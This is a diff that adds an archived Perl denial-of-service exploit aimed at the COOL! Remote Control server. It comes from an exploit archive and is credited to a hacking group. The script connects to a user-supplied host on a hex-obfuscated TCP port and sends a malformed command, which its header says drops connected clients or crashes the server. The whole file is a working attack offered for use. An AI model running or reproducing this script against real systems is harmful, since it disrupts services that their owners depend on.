@@ -1,0 +1,52 @@
+#!usr/bin/perl
+#
+#      COOL! Command Execution DOS Exploit
+# --------------------------------------------
+#      Infam0us Gr0up - Securiti Research
+#
+# Info: infamous.2hell.com
+# Vendor URL: www.yaosoft.com
+# 
+# * If Remote Control(Client application) is running then already connected to server,
+#   this command exploit will made Remote Control as Client disconnected from server machine.
+#   But if the Remote Control is not currently connected to Remote Server,then
+#   by send specified command to Remote Server its allow the server crashed/closed
+#
+
+
+$ARGC=@ARGV;
+if ($ARGC !=1) {
+    print "Usage: $0 [host]\n";
+    print "Exam: $0 127.0.0.1\n";
+    print "\n";
+    exit;
+}
+use Socket;
+
+my($remote,$port,$iaddr,$paddr,$proto);
+$remote=$ARGV[0];
+$popy = "\x31\x31\x39\x38\x30"; 
+
+print "\n[+] Connect to host..\n";
+$iaddr = inet_aton($remote) or die "[-] Error: $!";
+$paddr = sockaddr_in($popy, $iaddr) or die "[-] Error: $!";
+$proto = getprotobyname('tcp') or die "[-] Error: $!";
+
+socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die "[-] Error: $!";
+connect(SOCK, $paddr) or die "[-] Error: $!";
+
+print "[+] Connected\n";
+print "[+] Send invalid command..\n";
+
+$empty = 
+"\x49\x4e\x46\x41\x4d\x4f\x55\x531".
+"\x47\x52\x4f\x55\x50";
+
+send(SOCK, $empty, 0) or die "[-] Cannot send query: $!";
+sleep(2);
+print "[+] DONE\n";
+print "[+] Check if server crash!\n";
+close(SOCK);
+exit;
+
+# milw0rm.com [2005-09-11]
